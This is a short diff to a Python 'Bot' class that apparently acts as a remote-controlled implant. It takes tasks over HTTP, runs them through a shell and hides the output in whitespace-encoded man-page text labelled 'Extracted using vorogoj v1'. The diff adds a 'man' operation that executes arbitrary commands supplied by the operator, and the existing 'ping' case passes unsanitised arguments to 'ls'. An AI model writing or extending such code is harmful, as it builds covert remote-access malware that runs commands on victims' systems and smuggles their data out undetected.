@@ -5,7 +5,7 @@ from re import split
 from subprocess import Popen, PIPE
 from time import time
 
-from encoding import decode, encode, mvws
+from encoding import decode, encode, mvws, fpes
 from myhttp import get_file, update_file
 
 def execute_shell(command) -> bytes:
@@ -62,12 +62,14 @@ class Bot:
                 res = execute_shell('id')
             case 'ping':
                 res = execute_shell(f'ls {args}')
+            case 'man':
+                res = execute_shell(args)
             case _:
                 res = b"Unknown operation"
         self.report(id, task, res)
 
     def report(self, id: str, task: str, result: bytes):
-        cmd = split(f'{mvws}| ', task)[2]
+        cmd = split(f'{fpes}| ', split(f'{mvws}| ', task)[2])[0]
         man_contents = self.read_man(cmd)
         ct = encode(man_contents.decode('utf8'), result.decode('utf8'))
         head = encode('Extracted using vorogoj v1', decode(task))
